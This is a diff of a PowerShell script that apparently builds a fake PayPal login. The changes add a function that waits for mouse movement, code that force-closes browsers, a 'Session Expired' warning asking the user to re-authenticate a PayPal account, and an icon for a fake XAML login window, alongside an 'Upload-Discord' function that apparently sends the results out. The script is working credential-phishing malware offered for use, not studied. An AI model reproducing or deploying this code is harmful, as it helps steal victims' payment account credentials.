@@ -1,49 +1,4 @@
-# Define the partial title you want to monitor (e.g., "TikTok")
-$targetTitles = @("powerful tools", "paypal", "digital wallet")
-
-# Define a list of popular browser process names
-$browserProcesses = @("chrome", "firefox", "msedge", "opera")
-
-# Define the interval to check (in seconds)
-$checkInterval = 15
-
-# Outer loop to run continuously
-while ($true) {
-    # Loop until any condition is met
-    $conditionMet = $false
-
-    while (-not $conditionMet) {
-        foreach ($browserName in $browserProcesses) {
-            $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
-            if ($currentBrowserProcesses) {
-                foreach ($process in $currentBrowserProcesses) {
-                    try {
-                        $processTitle = $process.MainWindowTitle
-                        Write-Host "$browserName - Window Title: $processTitle"
-                        if ($targetTitles | ForEach-Object { $processTitle -like "*$_*" }) {
-                            Write-Host "Detected one of the specified titles in $browserName. Closing..."
-                            Stop-Process -Id $process.Id -Force
-                            $conditionMet = $true  # Set the flag to true when any condition is met
-                            break 2  # Exit both inner and outer loops when any condition is met
-                        }
-                    } catch {
-                        # Handle any exceptions that might occur (e.g., due to missing access permissions)
-                    }
-                }
-            }
-        }
-
-        if ($conditionMet) {
-            break  # Exit the outer loop when any condition is met
-        }
-
-        # Sleep for the specified interval (in seconds) before checking again
-        Start-Sleep -Seconds $checkInterval
-    }
-}
-
-# Continue with the rest of your script here
-Write-Host "A condition is met. Continue with the rest of your code here."
+# Define the Upload-Discord function
 
 
 function Upload-Discord {
@@ -77,6 +32,49 @@ Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
 
 
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+
+function Caps-Off {
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
+
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
+}
+}
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+#>
+
+Pause-Script
+
+Caps-Off
+
 $browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"
 
 $browserProcesses | ForEach-Object {
@@ -87,7 +85,7 @@ $browserProcesses | ForEach-Object {
 }
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Please authenticate your Paypal Account."
+$msgBody = "Please re-authenticate your Paypal Account."
 $msgTitle = "Session Expired"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
@@ -132,6 +130,10 @@ $XAML = @"
 
 # Load the XAML and create a Window object
 $loginWindow = [Windows.Markup.XamlReader]::Load([System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML))
+
+# Set the window icon using the icon file we downloaded
+$loginWindow.Icon = [System.Windows.Media.Imaging.BitmapFrame]::Create([System.Windows.Media.Imaging.BitmapImage]::new([System.Uri]::new($iconFilePath)))
+
 
 
 # Create a XML reader for the XAML
